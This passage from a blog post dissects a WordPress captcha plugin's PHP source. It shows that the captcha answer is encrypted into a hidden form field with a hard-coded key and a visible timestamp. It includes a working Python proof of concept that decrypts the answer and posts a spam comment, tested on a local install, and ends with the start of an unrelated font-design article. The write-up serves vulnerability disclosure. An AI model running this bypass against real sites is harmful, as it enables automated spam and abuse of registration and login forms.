<span class="x">            $math_actions[] = &#39;×&#39;;</span>

<span class="x">        // Which field from three will be the input to enter required value</span>
<span class="x">        $rand_input = rand( 0, 2 );</span>
<span class="x">        // Which field from three will be the letters presentation of numbers</span>
<span class="x">        $rand_number_string = rand( 0, 2 );</span>
<span class="x">        // If don&#39;t check Word in setting page - $rand_number_string not display</span>
<span class="x">        if( 0 == $cptch_options[&quot;cptch_difficulty_word&quot;])</span>
<span class="x">            $rand_number_string = -1;</span>
<span class="x">        // Set value for $rand_number_string while $rand_input = $rand_number_string</span>
<span class="x">        while($rand_input == $rand_number_string) {</span>
<span class="x">            $rand_number_string = rand( 0, 2 );</span>
<span class="x">        }</span>
<span class="x">        // What is math action to display in the form</span>
<span class="x">        $rand_math_action = rand( 0, count($math_actions) - 1 );</span>

<span class="x">        $array_math_expretion = array();</span>

<span class="x">        // Add first part of mathematical expression</span>
<span class="x">        $array_math_expretion[0] = rand( 1, 9 );</span>
<span class="x">        // Add second part of mathematical expression</span>
<span class="x">        $array_math_expretion[1] = rand( 1, 9 );</span>
<span class="x">        // Calculation of the mathematical expression result</span>
<span class="x">        switch( $math_actions[$rand_math_action] ) {</span>
<span class="x">            case &quot;+&quot;:</span>
<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] + $array_math_expretion[1];</span>
<span class="x">                break;</span>
<span class="x">            case &quot;−&quot;:</span>
<span class="x">                // Result must not be equal to the negative number</span>
<span class="x">                if($array_math_expretion[0] &lt; $array_math_expretion[1]) {</span>
<span class="x">                    $number                                     = $array_math_expretion[0];</span>
<span class="x">                    $array_math_expretion[0]    = $array_math_expretion[1];</span>
<span class="x">                    $array_math_expretion[1]    = $number;</span>
<span class="x">                }</span>
<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] - $array_math_expretion[1];</span>
<span class="x">                break;</span>
<span class="x">            case &quot;×&quot;:</span>
<span class="x">                $array_math_expretion[2] = $array_math_expretion[0] * $array_math_expretion[1];</span>
<span class="x">                break;</span>
<span class="x">        }</span>

<span class="x">        // String for display</span>
<span class="x">        $str_math_expretion = &quot;&quot;;</span>
<span class="x">        // First part of mathematical expression</span>
<span class="x">        if( 0 == $rand_input )</span>
<span class="x">            $str_math_expretion .= &quot;&quot;;</span>
<span class="x">        else if ( 0 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] )</span>
<span class="x">            $str_math_expretion .= $number_string[$array_math_expretion[0]];</span>
<span class="x">        else</span>
<span class="x">            $str_math_expretion .= $array_math_expretion[0];</span>

<span class="x">        // Add math action</span>
<span class="x">        $str_math_expretion .= &quot; &quot;.$math_actions[$rand_math_action];</span>

<span class="x">        // Second part of mathematical expression</span>
<span class="x">        if( 1 == $rand_input )</span>
<span class="x">            $str_math_expretion .= &quot; &quot;;</span>
<span class="x">        else if ( 1 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] )</span>
<span class="x">            $str_math_expretion .= &quot; &quot;. $number_string[$array_math_expretion[1]];</span>
<span class="x">        else</span>
<span class="x">            $str_math_expretion .= &quot; &quot;.$array_math_expretion[1];</span>

<span class="x">        // Add =</span>
<span class="x">        $str_math_expretion .= &quot; = &quot;;</span>

<span class="x">        // Add result of mathematical expression</span>
<span class="x">        if( 2 == $rand_input ) {</span>
<span class="x">            $str_math_expretion .= &quot; &quot;;</span>
<span class="x">        } else if ( 2 == $rand_number_string || 0 == $cptch_options[&quot;cptch_difficulty_number&quot;] ) {</span>
<span class="x">            if( $array_math_expretion[2] &lt; 10 )</span>
<span class="x">                $str_math_expretion .= &quot; &quot;. $number_string[$array_math_expretion[2]];</span>
<span class="x">            else if( $array_math_expretion[2] &lt; 20 &amp;&amp; $array_math_expretion[2] &gt; 10 )</span>
<span class="x">                $str_math_expretion .= &quot; &quot;. $number_two_string[ $array_math_expretion[2] % 10 ];</span>
<span class="x">            else {</span>
<span class="x">                if ( get_bloginfo( &#39;language&#39;,&#39;Display&#39; ) == &quot;nl-NL&quot; ) {</span>
<span class="x">                    $str_math_expretion .= &quot; &quot;.( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] . __( &quot;and&quot;, &#39;captcha&#39; ) : &#39;&#39; ) . $number_three_string[ $array_math_expretion[2] / 10 ];</span>
<span class="x">                } else {</span>
<span class="x">                    $str_math_expretion .= &quot; &quot; . $number_three_string[ $array_math_expretion[2] / 10 ].&quot; &quot;.( 0 != $array_math_expretion[2] % 10 ? $number_string[ $array_math_expretion[2] % 10 ] : &#39;&#39;);</span>
<span class="x">                }</span>
<span class="x">            }</span>
<span class="x">        } else {</span>
<span class="x">            $str_math_expretion .= $array_math_expretion[2];</span>
<span class="x">        }</span>
<span class="x">        // Add hidden field with encoding result</span>
<span class="x">        $content .= &#39;</span>

<span class="x">        &#39;;</span>
<span class="x">        $content .= $str_math_expretion; </span>
<span class="x">        return $content;</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>What can we see on the first view? The author declares several arrays
holding integer strings on a rather painful way. He then continues to
build the maths equation captcha with a variable called
<code>$array_math_expretion</code> (Introduced on line 68). I am pretty sure he
means <code>$array_math_expression</code>. But shit happens. I mean the plugin
is only 2.5 years old and in the very early version 3.8.7. Who cares
about grammar anyways?</p>
<p>Lot's of hard understandable code follows. Some random integers are
obtained to built the fancy <em>expretion</em>. And, wait, what's that on line
80?!</p>
<div class="highlight"><pre><span class="x">// Result must not be equal to the negative number</span>
<span class="x">if($array_math_expretion[0] &lt; $array_math_expretion[1]) {</span>
<span class="x">   $number = $array_math_expretion[0];</span>
<span class="x">   $array_math_expretion[0] = $array_math_expretion[1];</span>
<span class="x">   $array_math_expretion[1] = $number;</span>
<span class="x">}</span>
</pre></div>


<p>The author prevents the subtraction to become negative on a cumbersome
way. Really?! Is the missing associative property that hard to work
around?</p>
<p>Well let's go further. I really don't care how exactly the mathematical
expression is built, I just know that it infinitely sucks.</p>
<p>Consider the final lines 135 to 140. There the captcha answer is
<em>encoded</em> and then injected into the form where the user has to enter
the captcha. Normally injecting encrypted hidden input fields is a
common technique among web developers. But only under the supposition
that the hidden field values are properly encrypted. Let's see if the
author did so. That being said we have a look at the function encode():</p>
<div class="highlight"><pre><span class="x">// Function for encodinf number</span>
<span class="x">if ( ! function_exists( &#39;encode&#39; ) ) {</span>
<span class="x">    function encode( $String, $Password, $cptch_time ) {</span>
<span class="x">        // Check if key for encoding is empty</span>
<span class="x">        if ( ! $Password ) die ( __( &quot;Encryption password is not set&quot;, &#39;captcha&#39; ) );</span>

<span class="x">        $Salt = md5( $cptch_time, true );</span>
<span class="x">        $String = substr( pack( &quot;H*&quot;, sha1( $String ) ), 0, 1 ).$String;</span>
<span class="x">        $StrLen = strlen( $String );</span>
<span class="x">        $Seq = $Password;</span>
<span class="x">        $Gamma  = &#39;&#39;;</span>
<span class="x">        while ( strlen( $Gamma ) &lt; $StrLen ) {</span>
<span class="x">                $Seq = pack( &quot;H*&quot;, sha1( $Seq . $Gamma . $Salt ) );</span>
<span class="x">                $Gamma.=substr( $Seq, 0, 8 );</span>
<span class="x">        }</span>

<span class="x">        return base64_encode( $String ^ $Gamma );</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>Again, before I even would dig deeper into the encoding function, I want
to know how it is called. Maybe the input parameters are predictable. Oh
boy, they are. The encoding function on line 136 in the previous code
snippet is called with two global variables, a timestamp and a
<em>password</em>, as well as the captcha expression string:</p>
<div class="highlight"><pre><span class="x">$str_key //the password</span>
<span class="x">$cptch_time // the timestamp</span>
</pre></div>


<p>These variables (the freaking password!) are initialized at the
beginning of the plugin to the following values:</p>
<div class="highlight"><pre><span class="x">// Add global setting for Captcha</span>
<span class="x">global $wpmu, $str_key, $cptch_time;</span>
<span class="x">$str_key = &quot;bws_3110013&quot;;</span>
<span class="x">$cptch_time = time();</span>
</pre></div>


<p>Well, what does that mean?</p>
<p>Whenever a captcha is generated, the captcha answer is <em>encrypted</em> with
a fully exposed password (<em>bws_3110013</em>) and a known timestamp (The
timestamp is known because it is also sent as hidden field in the form).
That means we can just apply the decode() function on the hidden values
whenever we fill out a form and can thus calculate the captcha answer
ourselves with the hidden input parameters! BOOM, captcha solved without
even applying OCR techniques (As far as parsing theses simple equations
counts as OCR).</p>
<p>Here for completeness sake the decode() function (I honestly cannot say
whether the encryption level is good, because I don't have profound
knowledge of cryptography, but it does look very weak to me. Could you
elaborate on it? Leave me a comment :P):</p>
<div class="highlight"><pre><span class="x">// Function for decoding number</span>
<span class="x">if ( ! function_exists( &#39;decode&#39; ) ) {</span>
<span class="x">    function decode( $String, $Key, $cptch_time ) {</span>
<span class="x">        // Check if key for encoding is empty</span>
<span class="x">        if ( ! $Key ) die ( __( &quot;Decryption password is not set&quot;, &#39;captcha&#39; ) );</span>

<span class="x">        $Salt = md5( $cptch_time, true );</span>
<span class="x">        $StrLen = strlen( $String );</span>
<span class="x">        $Seq = $Key;</span>
<span class="x">        $Gamma  = &#39;&#39;;</span>
<span class="x">        while ( strlen( $Gamma ) &lt; $StrLen ) {</span>
<span class="x">                $Seq = pack( &quot;H*&quot;, sha1( $Seq . $Gamma . $Salt ) );</span>
<span class="x">                $Gamma.= substr( $Seq, 0, 8 );</span>
<span class="x">        }</span>

<span class="x">        $String = base64_decode( $String );</span>
<span class="x">        $String = $String^$Gamma;</span>

<span class="x">        $DecodedString = substr( $String, 1 );</span>
<span class="x">        $Error = ord( substr( $String, 0, 1 ) ^ substr( pack( &quot;H*&quot;, sha1( $DecodedString ) ), 0, 1 ));</span>

<span class="x">        if ( $Error ) </span>
<span class="x">            return false;</span>
<span class="x">        else </span>
<span class="x">            return $DecodedString;</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>I should prove my above allegations? I will terminate my experiments
soon and then I'll post a exploitation of this weakness written in
Python. I will also add this POC on my github account. But for now the
explanation above will suffice.</p>
<p><strong>Edit: As promised, here is the code that reverses the decode
function:</strong></p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">lxml.html</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="c"># A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and </span>
<span class="c"># should have a open comment form. This &#39;attack&#39; works on every form that the plugin supports [E.g. registration,</span>
<span class="c"># login, ...]. This renders the captcha completely useless.</span>

<span class="c"># Author: Nikolai Tschacher</span>
<span class="c"># Date: 07.11.2013</span>

<span class="c"># tested on my local lamp with version 3.8.7</span>
<span class="n">TARGET</span> <span class="o">=</span> <span class="s">&quot;http://localhost/~nikolai/wordpress/?p=1&quot;</span> <span class="c"># The landing site.</span>
<span class="n">COMMENT_POST</span> <span class="o">=</span> <span class="s">&quot;http://localhost/~nikolai/wordpress/wp-comments-post.php&quot;</span> <span class="c"># The comment form to send POST requests at.</span>
<span class="n">KEY</span> <span class="o">=</span> <span class="s">&quot;bws_3110013&quot;</span>

<span class="k">def</span> <span class="nf">no_plugin</span><span class="p">(</span><span class="n">reason</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&#39;The plugin hidden fields couldn</span><span class="se">\&#39;</span><span class="s">t be located. Make sure it is installed. Reason: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">reason</span><span class="p">))</span>
    <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="c"># This function reverses essentially the encoding of the hidden field cptch_result.</span>
<span class="c"># It is exactly the same function with the same password as in the plugin source code.</span>
<span class="k">def</span> <span class="nf">reverse</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">cptch_time</span><span class="p">):</span>
    <span class="c"># just convert all but the captcha string to ascii</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">)</span>
    <span class="n">cptch_time</span> <span class="o">=</span> <span class="n">cptch_time</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s">&#39;[i] Trying to decode key: {}, captcha: {} and cptch_time: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">cptch_time</span><span class="p">))</span>

    <span class="n">d</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
    <span class="n">d</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">cptch_time</span><span class="p">)</span>
    <span class="n">salt</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>

    <span class="n">slen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">captcha</span><span class="p">)</span>
    <span class="n">seq</span> <span class="o">=</span> <span class="n">key</span>
    <span class="n">gamma</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">gamma</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">slen</span><span class="p">:</span>
        <span class="n">sha</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
        <span class="n">L</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">gamma</span><span class="p">)</span>
        <span class="n">L</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">salt</span><span class="p">)</span>
        <span class="n">sha</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">L</span><span class="p">)</span>
        <span class="n">seq</span> <span class="o">=</span> <span class="n">sha</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
        <span class="n">gamma</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">seq</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>

    <span class="n">decoded</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">captcha</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="s">&#39;utf-8&#39;</span><span class="p">));</span>
    <span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">cc</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">captcha</span><span class="p">,</span> <span class="n">gamma</span><span class="p">):</span>
        <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">cc</span><span class="p">))</span>
    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
        <span class="c"># Obtain post parameters from comment form</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cerr</span><span class="p">))</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">terr</span><span class="p">))</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>

        <span class="c"># Parse parameters and solve captcha</span>

        <span class="n">dom</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">el</span> <span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;cptch_block&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">except</span> <span class="ne">IndexError</span> <span class="k">as</span> <span class="n">ierr</span><span class="p">:</span>
            <span class="n">no_plugin</span><span class="p">(</span><span class="s">&#39;find_class cptch_block&#39;</span><span class="p">)</span> <span class="c"># No such CSS class found means most likely the plugin is not installed.</span>

        <span class="n">captcha</span> <span class="o">=</span> <span class="n">el</span><span class="o">.</span><span class="n">text_content</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
                <span class="k">try</span><span class="p">:</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span>
                                <span class="n">result</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span>
                                <span class="n">time</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
                        <span class="k">pass</span>

        <span class="n">el</span><span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;form-submit&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
                <span class="k">try</span><span class="p">:</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span>
                                <span class="n">post_id</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span>
                                <span class="n">comment_parent</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
                        <span class="k">pass</span>

        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Captcha is &quot;{}&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span>

        <span class="c"># Try to crickiticrack it :P [Well we just use the decode() functon]</span>
        <span class="n">solution</span> <span class="o">=</span> <span class="n">reverse</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">time</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Found solution: &quot;{}&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">solution</span><span class="p">))</span>

        <span class="c"># No write a comment with the cracked captcha to proof that we provided the</span>
        <span class="c"># correct solution.</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;author&#39;</span><span class="p">:</span> <span class="s">&#39;spammer&#39;</span><span class="p">,</span> <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="s">&#39;spammer@spamhouse.org&#39;</span><span class="p">,</span> <span class="s">&#39;url&#39;</span><span class="p">:</span> <span class="s">&#39;http://spamming.com&#39;</span><span class="p">,</span>
        <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="p">,</span> <span class="s">&#39;cptch_number&#39;</span><span class="p">:</span> <span class="n">solution</span><span class="p">,</span>
        <span class="s">&#39;comment&#39;</span><span class="p">:</span> <span class="s">&quot;Hi there! No protection from spammers!!!!:D&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Post+Comment&#39;</span><span class="p">,</span>
        <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span> <span class="n">post_id</span><span class="p">,</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span> <span class="n">comment_parent</span><span class="p">}</span>

        <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">COMMENT_POST</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cerr</span><span class="p">))</span>
        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">terr</span><span class="p">))</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</pre></div>


<h3>Conclusion</h3>
<p>Let me summarize:</p>
<ul>
<li>The captcha implementation of the plugin is bad because it does not
    prevent computers from solving it (The idea behind serving
    mathematical equations in this form is highly debatable).</li>
<li>The captcha author implements his own encryption function, which is
    almost always a very bad idea as long as your name is not Bruce
    Scheier or you aren't a mathematician.</li>
<li>The captcha plugin stores clear text passwords in the source code
    visible to anyone.</li>
<li>The captcha plugin has a very big user base (Over one million
    downloads) and a alarming high rating.</li>
<li>The <a href="http://bestwebsoft.com/" title="BestWebSoft">authors</a> earn money with
    this shitty software and the users are left completely unsecured.</li>
</ul>
<p>Maybe the worst part of all this is, that there's also a premium version
of this plugin. And the most frightening observance: Most users are
completely unaware of the consequences from using such software (Derived
by the average high ratings for this plugin). For instance, I found the
following business comment on the vendor site. This is absolutely
ridiculous.</p>
<p><a href="/uploads/2013/11/Screenshot-from-2013-11-04-072343.png"><img alt="Client from BestWebSoft ordering captcha for several thousand dollars without knowing the
quality." src="/uploads/2013/11/Screenshot-from-2013-11-04-072343-1024x576.png" /></a></p>
<p>Anyways, that's been it! Send me letter for Xmas!</p>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/create-your-own-font-the-hard-way.html#create-your-own-font-the-hard-way">Create your own font the hard way!</a></h2>
    <p>
      Posted on Mi 16 Oktober 2013 in <a href="/category/learning.html">Learning</a>
      &#8226; Tagged with
      <a href="/tag/captcha.html">Captcha</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/design.html">Design</a>,      <a href="/tag/glyphs.html">Glyphs</a>,      <a href="/tag/learning.html">Learning</a>,      <a href="/tag/font.html">Font</a>    </p>
  </header>
  <div>
      <p><em>Last major update on 23.10.2013</em>  </p>
<h3>Preface</h3>
<p>As promised previously in my last article, I will guide you through the
creation process of a rudimentary font. I will use the glyphs of my font
to draw captchas and incorportate the implementation in my brand new
captcha plugin for wordpress. There are already quite a few captcha
plugins out there, some of them are better than mine
(<a href="http://www.google.com/recaptcha">RECAPTCHA</a>for instance translates
books and thus solves two problems at the same time),
<a href="http://wordpress.org/plugins/captcha/">others</a> are worse, because the
math equations can simply be parsed (As far as I can judge without
inspecting the code further).</p>
<p>In this article however, I will center the focus entirely on the font
and abstract from it's future usage in the captcha.</p>
<h3>Technical background of fonts</h3>
<p>A logical start of font creation is to answer the question what type of
font we are going to create. But lets first introduce some concepts that
are of importance when it comes to font design.</p>
<p>In short: A font is a collection of glyphs. Each glyph has a shape and
there are various ways of describing that shape. You can imagine a glyph
as a instanteation of a character. Whereas a character is a conecpt a
glyph is a reification of that concept. When we speak of glyphs, we are
interested in the form, design and view of the character, not the
character itself as a carrier of information. Now in our latin font,
there is a one-to-one mapping of glyphs to characters. But in some other
languages there might be different glyphs for a character depending on
the adjacent characters (For instance in arabic some characters have
four or more different glyphs).</p>
<p>Now lets answer the question which font format we are going to choose.
Essentially, there are three different font types, each of them with
different advantages and drawbacks. They are:</p>
<ul>
<li>
<h4>Bitmap fonts</h4>
<p>Fonts in this format are described in a array of pixels (a bitmap).
You can imagine the array as a two-dimensional coordinate system and
when rasterizing the font you just copy that array in the coordinate
system of the output canvas. The glyph information is rather
unflexible, because there is not an easy and intuitive way to resize
the single glyphs and therefore there are usually different bitmaps
for the different sizes and stlyes of penmanships such as cursive,
bold or normal.</p>
</li>
<li>
<h4>Outline fonts</h4>
<p>This format takes a different approach. Here we won't store the
actual coordinates of glyphs. Instead we store the information of
how to draw the glyphs as a mathematical function with different
paramters which control the shape (cursive, bold, normal) and size
(12px, 36px, npx) and other aspects of the appearance of each glyph.
An outline is a set of contours or paths, and the paths consist of
Bézier splines and simple lines. The splines are normally quadratic
or cubic bezier curves. Therefore the glyphs are only rastered when
the application already determined all the parameters. Outline fonts
are very dynamic and powerful, but require a lot more of processing
power compared to bitmap fonts. Postscript and truetype fonts are
examples of this format.</p>
</li>
<li>
<h4>Stroke fonts</h4>
<p>Are stroked fonts, where each stem of the glyph is represented by
one line down the center of the stem, and the line is later drawn
with a certain widt. I am not particularly
interested in stroke fonts, but in the case you are, just read it up
in the interwebs.</p>
</li>
</ul>
<p>I will develop a outline font, but compared to
TrueType/OpenType/PostScript fonts, it will be in a very basic format
and not even include the full alphabet (Just around 10-15 characters).
Furthermore I will use quadratic and cubic Bézier splines. The glyphs
will be of very very easy shape (Each glyph will essentially be only a
path), but for some characters I will add some additional parameters to
illustrate the entire possibilities. The final plugin written in PHP
will be able to save the captchas to png and bbm files, both of them are
bitmap formats.<br />
It'd be certainly possible to directly use vector graphic techniques
(Such as scalable vector graphics) and let the plugin just generate
them. As a layman, I think this would be considerably faster and a
<em>better</em> solution, since I can use the high level language SVG and the
rasterization process will happen on the client-side and not on the
server as in my intentional approach.</p>
<h3>Why is this faster?</h3>
<p>Because the most time consuming process is the rasterization of the
specific Bézier splines and simple lines that define the single glyphs
of the font. SVG files just describe the shape of these characters, but
the final drawing process to the monitor happens in the browser of the
client.<br />
But on the other side, I guess that .svg captchas are more easily
deciphered (OCR in short), because the cracker does not have to remove
noise and guess the bitmap structure which comprises the actual letters
(Please leave a comment if you think differently).<br />
That being said, I will still use the latter way (Plotting my captcha
directly and producing bitmap pictures like PNG's) in the full
conscience that it might be the worse solution (Heck, writing captcha
software in 2013 <em>is</em> certainily a bad idea). But all this is legitmated
with the fruitful learning process that accompanies the coding process.</p>
<p>Now in the case you shrug your shoulders when I mention Bézier curves,
consider reading my <a href="http://incolumitas.com/2013/10/06/plotting-bezier-curves/">previous blog
article</a> that
also includes a bunch of links to very nice resources. Be aware that
quite a bit of math hides behind Bézier splines and that I won't use
heavily optimized algorithms for plotting the splines, simply out of the
reason that I don't have the mathematical/algorithmic knowledge and
skill to do so.</p>
<p>If I got you hooked and you also want to create your own fonts and you
want to really use them everywhere and save them in a offical format
such as PostScript, SVG or TrueType/OpenType, consider the application
FontForge [Link goes here], that helps you quite a lot and bewares you
of the quirky low level plotting algorithms. For my font, I just use
FontForge and Inkscape to get a look and feel experience of how my
glyphs sould look like, since it's kinda hard to think entirely in
points and control points of Bézier splines without actually drawing
them ;)</p>
<h3>Approach</h3>
<p>Because I needed some kind of sketch board to develop and design my
glyphs, I looked for a vector graphics application.
<a href="http://inkscape.org">Inkscape</a> really fit perfectly and it generates
